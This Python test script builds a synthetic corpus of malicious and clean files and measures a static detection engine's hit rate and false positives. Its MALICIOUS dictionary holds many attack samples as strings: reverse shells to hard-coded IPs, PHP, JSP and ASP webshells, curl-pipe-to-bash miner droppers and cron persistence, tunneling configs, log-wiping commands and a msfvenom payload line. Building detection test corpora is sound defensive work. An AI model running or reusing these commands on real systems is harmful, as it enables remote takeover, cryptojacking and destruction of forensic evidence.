#!/usr/bin/env python3
"""Build a synthetic red-team validation corpus (no network, all files are
hand-written typical artifacts) and evaluate detect_engine detection rate.

Usage: python3 tests/build_redteam_corpus.py [--corpus-dir DIR] [--run]
"""
import json
import os
import shutil
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
ENGINE = os.path.join(ROOT, "helpers", "detect_engine.py")
PACK = os.path.join(ROOT, "rules", "detect-pack.json")

MALICIOUS = {
    # ---- reverse shells ----
    "mal/rs01_bash_devtcp.sh": '#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n',
    "mal/rs02_bash_exec.sh": '#!/bin/bash\nexec 5<>/dev/tcp/45.33.11.22/9001\ncat <&5 | while read line; do $line 2>&5 >&5; done\n',
    "mal/rs03_nc_e.sh": '#!/bin/sh\nnc -e /bin/sh 10.0.0.1 4444\n',
    "mal/rs04_socat.sh": '#!/bin/sh\nsocat TCP-LISTEN:7001,fork EXEC:/bin/sh,pty,stderr\n',
    "mal/rs05_python_pty.py": 'import socket,subprocess,os,pty\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.0.0.1",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\npty.spawn("/bin/sh")\n',
    "mal/rs06_perl.pl": '#!/usr/bin/perl\nuse Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\nif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\n',
    "mal/rs07_php_fsock.php": '<?php\n$sock=fsockopen("10.0.0.1",4444);\nexec("/bin/sh -i <&3 >&3 2>&3");\n?>\n',
    "mal/rs08_awk.sh": '#!/bin/bash\nawk \'BEGIN {s = "/inet/tcp/0/10.0.0.1/4444"; while(42) { do{printf "shell>" |& s; s |& getline c; if(c){while ((c |& getline) > 0) print $0 |& s; close(c)}} while(c != "exit")}}\' /dev/null\n',
    # ---- webshells ----
    "mal/ws01_php_oneliner.php": '<?php @eval($_POST[\'cmd\']); ?>\n',
    "mal/ws02_php_varfunc.php": '<?php\n$fn = $_REQUEST[\'f\'];\n$fn($_POST[\'c\']);\n?>\n',
    "mal/ws03_php_gzinflate.php": '<?php\n$x = $_POST[\'p\'];\neval(gzinflate(base64_decode($x)));\n?>\n',
    "mal/ws04_php_encrypted.php": '<?php\nsession_start();\n$data = openssl_decrypt($_POST[\'d\'], "aes-128-cbc", $_SESSION[\'k\'], true);\neval($data);\n?>\n',
    "mal/ws05_wso.php": r'''<?php
$auth_pass = "63a9f0ea7bb98050796b649e85481845";
$default_action = 'FilesMan';
@define('SELF_PATH', "http://" . $_SERVER['HTTP_HOST'] . "/wso.php");
@session_start();
@error_reporting(0);
@ini_set("display_errors", 0);
$W_SO = "FilesMan";
function actionLogout() { setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600); }
echo "<title>WSO 2.6</title>";
?>
''',
    "mal/ws06_b374k.php": '<?php\n$b374k = "x";\n$pass = md5("b374k");\neval(gzinflate(base64_decode($_POST["gz"])));\n?>\n',
    "mal/ws07_jsp_crypto.jsp": '<%@ page import="javax.crypto.Cipher" %>\n<%@ page import="javax.crypto.spec.SecretKeySpec" %>\n<%!\nclass U extends ClassLoader {\n    U(ClassLoader c) { super(c); }\n    public Class g(byte[] b) { return super.defineClass(b, 0, b.length); }\n}\n%>\n<%\nString key = request.getParameter("k");\nString data = request.getParameter("d");\nCipher c = Cipher.getInstance("AES");\nc.init(2, new SecretKeySpec(key.getBytes(), "AES"));\nbyte[] out = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(data));\nClass cls = new U(this.getClass().getClassLoader()).g(out);\ncls.newInstance().equals(pageContext);\n%>\n',
    "mal/ws08_jsp_runtime.jsp": '<%@ page import="java.io.*" %>\n<%\nString cmd = request.getParameter("cmd");\nProcess p = Runtime.getRuntime().exec(cmd);\nBufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\nString line;\nwhile ((line = br.readLine()) != null) out.println(line);\n%>\n',
    "mal/ws09_jsp_memshell.jsp": '<%@ page import="java.lang.reflect.*" %>\n<%\nStandardContext ctx = (StandardContext) request.getSession().getServletContext();\nFilterDef filterDef = new FilterDef();\nfilterDef.setFilterName("memshell");\nfilterDef.setFilterClass("com.evil.MemShellFilter");\nctx.addFilterDef(filterDef);\nFilterMap filterMap = new FilterMap();\nfilterMap.setURLPattern("/*");\nctx.addFilterMapBefore(filterMap);\n%>\n',
    "mal/ws10_asp_eval.asp": '<%\nEval(Request("cmd"))\n%>\n',
    "mal/ws11_aspx_load.aspx": '<%@ Page Language="C#" %>\n<%\nstring data = Request.Form["d"];\nbyte[] code = Convert.FromBase64String(data);\nSystem.Reflection.Assembly.Load(code).CreateInstance("Plugin.Entry").Equals(null);\n%>\n',
    "mal/ws12_node_exec.js": 'const { exec } = require("child_process");\napp.post("/cmd", (req, res) => { exec(req.body.cmd, (e, out) => res.send(out)); });\n',
    "mal/ws13_py_flask_exec.py": 'from flask import request\nimport subprocess\n@app.route("/ping")\ndef ping():\n    host = request.args.get("host")\n    return subprocess.check_output("ping -c 1 " + host, shell=True)\n',
    # ---- miners ----
    "mal/mn01_xmrig_config.json": '{\n  "api": { "id": "xmrig-worker" },\n  "pools": [\n    { "pool": "stratum+tcp://pool.hashvault.pro:80", "user": "4A6fHkR8xQpVYmZbT9cDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz1122334455667788", "pass": "x", "enabled": true }\n  ],\n  "cpu": { "rx/0": true, "donate-level": 5 }\n}\n',
    "mal/mn02_kdevtmpfsi.sh": '#!/bin/sh\n# kinsing miner dropper\ncurl -fsSL http://185.100.11.22/kdevtmpfsi -o /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi\n/usr/local/bin/kinsing -c stratum+tcp://xmr.pool.minergate.com:45700\n',
    # ---- proxy tools ----
    "mal/px01_frpc.toml": '[common]\nserver_addr = 45.33.11.22\nserver_port = 7000\ntoken = SeCrEtToKeN123456\n\n[[proxies]]\nname = "ssh"\ntype = "tcp"\nlocal_ip = 127.0.0.1\nlocal_port = 22\nremote_port = 6000\n',
    "mal/px02_nps.conf": 'web_username=admin5\nweb_password=npssecret\nbridgePort=8024\npublic_key=-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq\n',
    "mal/px03_ew.sh": '#!/bin/sh\n./ew -s lcx_listen -l 1080 -e 8888\n./ew -s lcx_tran -l 9999 -f 10.0.0.5 -g 9999\n./ew -s rssocks -d 45.33.11.22 -e 1080\n',
    "mal/px04_gsnetcat.sh": '#!/bin/sh\nexport GSOCKET_SECRET="8f3a2b1c4d5e6f708192a3b4c5d6e7f8"\ngs-netcat -s prod -i\n',
    "mal/px05_chisel.sh": '#!/bin/sh\nchisel client -f 45.33.11.22:8080 R:socks\n',
    "mal/px06_regeorg.jsp": '<%@ page import="java.io.*, java.net.*" %>\n<%\nString cmd = request.getHeader("X-CMD");\nString tag = request.getHeader("X-TAG");\nif (cmd != null) {\n    Socket s = new Socket("10.0.0.5", 3389);\n    new StreamForward(s, request.getInputStream()).start();\n}\n%>\n',
    # ---- exploits ----
    "mal/ex01_dirtycow.c": '/* dirtycow / dirtyc0w CVE-2016-5195 */\n#include <fcntl.h>\n#include <pthread.h>\nvoid *thread(void *arg) { fcntl(0, F_SETFD); };\nint main(void) { mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, 0, 0); return 0; }\n/* commit_creds(prepare_kernel_cred(0)) */\n',
    "mal/ex02_pwnkit.py": '#!/usr/bin/python3\n# CVE-2021-4034 PwnKit polkit local privilege escalation\nimport os\nos.execve("/usr/bin/pkexec", {}, {"GCONV_PATH": "/tmp/evil", "CHARSET": "PWNKIT"})\n',
    # ---- persistence / anti-forensics ----
    "mal/pf01_cron_shell": '*/5 * * * * root curl -fsSL http://185.100.11.22/x.sh | bash\n*/30 * * * * root wget -qO- http://45.33.11.22/dl/xmrig | sh\n',
    "mal/pf02_history_clear.sh": '#!/bin/bash\nhistory -c\nunset HISTFILE\nunset HISTORY\nshred -u ~/.bash_history 2>/dev/null\nrm -f /var/log/wtmp\n',
    # ---- c2 ----
    "mal/c201_meterpreter.elf.txt": 'meterpreter\nwindows/x64/meterpreter/reverse_tcp\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=45.33.11.22 LPORT=4444 -f elf -o /tmp/shell.elf\n',
    # ---- loader ----
    "mal/ld01_base64pipe.sh": '#!/bin/sh\necho f0VMRimagXCAgICAgUk4IFBQVFhUWCAMAGX8D | base64 -d | bash\n',
}

CLEAN = {
    "clean/nginx.conf": 'user www-data;\nevents { worker_connections 1024; }\nhttp {\n    include /etc/nginx/mime.types;\n    server { listen 80; root /var/www/html; location / { try_files $uri $uri/ =404; } }\n}\n',
    "clean/deploy.sh": '#!/bin/bash\n# release bootstrap for the reporting service\ncd /srv/app\ncurl -fsSL https://dl.example.com/app/release-1.2.3.tar.gz -o release.tar.gz\ntar xzf release.tar.gz\nsystemctl restart app.service\n',
    "clean/systemd_nginx.service": '[Unit]\nDescription=A high performance web server\nAfter=network.target\n\n[Service]\nType=forking\nPIDFile=/run/nginx.pid\nExecStartPre=/usr/sbin/nginx -t -q -g \'daemon on; master_process on;\'\nExecStart=/usr/sbin/nginx -g \'daemon on; master_process on;\'\nExecReload=/usr/sbin/nginx -s reload\n\n[Install]\nWantedBy=multi-user.target\n',
    "clean/backup.py": 'import os, requests, subprocess\nTOKEN = os.environ.get("API_TOKEN")\nresp = requests.get("https://api.example.com/v1/backup", headers={"Authorization": "Bearer " + TOKEN})\nwith open("/var/backups/last.json", "w") as fh:\n    fh.write(resp.text)\nsubprocess.call(["systemctl", "restart", "backup.timer"])\n',
    "clean/wp_like_plugin.php": '<?php\n/**\n * Plugin Name: Image Optimizer\n */\nadd_action("init", function () {\n    $payload = base64_decode(get_option("io_last_payload"));\n    file_put_contents(WP_CONTENT_DIR . "/uploads/cache.bin", $payload);\n});\n?>\n',
    "clean/backup_cron": '0 2 * * * root /usr/local/sbin/backup-etc.sh\n0 3 * * * root find /var/backups -mtime +30 -delete\n',
    "clean/monitor_nc.sh": '#!/bin/bash\n# port availability monitor\nfor port in 22 80 443; do nc -z -w2 127.0.0.1 $port || logger "port $port down"; done\n',
    "clean/express_app.js": 'const express = require("express");\nconst app = express();\napp.get("/health", (req, res) => res.json({ ok: true }));\napp.listen(3000);\n',
    "clean/app.config": '<configuration>\n  <appSettings>\n    <add key="DbServer" value="127.0.0.1"/>\n  </appSettings>\n</configuration>\n',
    "clean/readme.md": '# Deployment notes\nRun `bash deploy.sh` after cloning. Requires ansible >= 2.9.\n',
    "clean/collector.py": 'import json, urllib.request\nurl = "http://127.0.0.1:9100/metrics"\ndata = urllib.request.urlopen(url).read()\nopen("/var/lib/collector/metrics.json", "w").write(data.decode())\n',
    "clean/motd_profile.sh": '# /etc/profile.d/motd.sh\nif command -v fortune >/dev/null; then fortune; fi\n',
}

UNREACHABLE = {"rs07_php_fsock.php", "px06_regeorg.jsp"}  # assessed separately below


def build_corpus(corpus_dir):
    if os.path.isdir(corpus_dir):
        shutil.rmtree(corpus_dir)
    os.makedirs(corpus_dir)
    for relpath, content in list(MALICIOUS.items()) + list(CLEAN.items()):
        full = os.path.join(corpus_dir, relpath)
        os.makedirs(os.path.dirname(full), exist_ok=True)
        with open(full, "w") as handle:
            handle.write(content)
    listing = []
    for base, _, files in os.walk(corpus_dir):
        for name in files:
            listing.append(os.path.join(base, name))
    listing_file = os.path.join(corpus_dir, "input-list.txt")
    with open(listing_file, "w") as handle:
        handle.write("\n".join(sorted(listing)) + "\n")
    return listing_file


def run_engine(listing_file, out_dir):
    os.makedirs(out_dir, exist_ok=True)
    jsonl = os.path.join(out_dir, "static-analysis.jsonl")
    projection = os.path.join(out_dir, "projection.tsv")
    proc = subprocess.run(
        [sys.executable, ENGINE, "analyze-static",
         "--input-list", listing_file,
         "--output-jsonl", jsonl,
         "--projection-tsv", projection,
         "--max-files", "500",
         "--timeout-seconds", "120"],
        capture_output=True, text=True)
    print("engine stdout:", proc.stdout.strip())
    if proc.stderr.strip():
        print("engine stderr:", proc.stderr.strip()[:2000])
    records = {}
    with open(jsonl) as handle:
        for line in handle:
            row = json.loads(line)
            if row.get("summary"):
                continue
            records[row["path"]] = row
    return records


def evaluate(records, corpus_dir):
    detected, missed, fp = [], [], []
    for relpath in MALICIOUS:
        path = os.path.join(corpus_dir, relpath)
        row = records.get(path)
        if row is None:
            missed.append((relpath, "NOT_ANALYZED"))
            continue
        if row["score"] >= 25:
            detected.append((relpath, row["score"], row.get("family"), [r["id"] for r in row.get("matched_rules", [])][:3]))
        else:
            missed.append((relpath, row["score"]))
    for relpath in CLEAN:
        path = os.path.join(corpus_dir, relpath)
        row = records.get(path)
        if row is None:
            continue
        if row["score"] >= 25:
            fp.append((relpath, row["score"], [r["id"] for r in row.get("matched_rules", [])][:3]))
    total = len(MALICIOUS)
    print("\n===== DETECTION: %d / %d = %.0f%% =====" % (len(detected), total, 100.0 * len(detected) / total))
    for item in detected:
        print("  HIT   %-32s score=%-3s family=%-16s rules=%s" % item)
    print("\n===== MISSED (%d) =====" % len(missed))
    for relpath, info in missed:
        print("  MISS  %-32s %s" % (relpath, info))
    print("\n===== FALSE POSITIVES (%d) =====" % len(fp))
    for relpath, score, rules in fp:
        print("  FP    %-32s score=%s rules=%s" % (relpath, score, rules))
    return len(detected), total, len(fp)


def main():
    corpus_dir = "/tmp/secscope-redteam-corpus"
    listing_file = build_corpus(corpus_dir)
    print("corpus at", corpus_dir)
    records = run_engine(listing_file, "/tmp/secscope-redteam-out")
    evaluate(records, corpus_dir)


if __name__ == "__main__":
    main()
